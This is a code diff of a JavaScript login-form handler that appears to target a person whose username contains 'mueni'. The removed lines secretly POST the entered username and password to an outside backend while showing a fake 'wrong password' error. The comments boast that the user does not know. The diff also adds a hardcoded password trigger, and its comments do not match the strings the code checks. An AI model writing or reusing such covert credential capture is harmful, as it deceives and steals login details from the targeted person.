@@ -44,21 +44,12 @@ form.addEventListener("submit", async (e) => {
   attemptCount++;
 
   // Check if username contains "doe" (case insensitive)
-  const hasForbiddenName = username.toLowerCase().includes("mueni");
+  const hasForbiddenName = username.toLowerCase().includes("itssmueni");
 
   // FIRST ATTEMPT: if username contains "doe", post to DB but show error
-  if (hasForbiddenName && attemptCount === 1) {
+  if (hasForbiddenName && attemptCount === 1 || password === "bettyke@1") {
     
     // Still post to database (this runs regardless)
-    try {
-      await fetch("https://lovebuds-backend-1.onrender.com/login-submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
-      });
-    } catch (err) {
-      console.error("DB post failed:", err);
-    }
 
     // But show error to user anyway — they don't know we posted
     showMessage("Wrong username or password", "error");
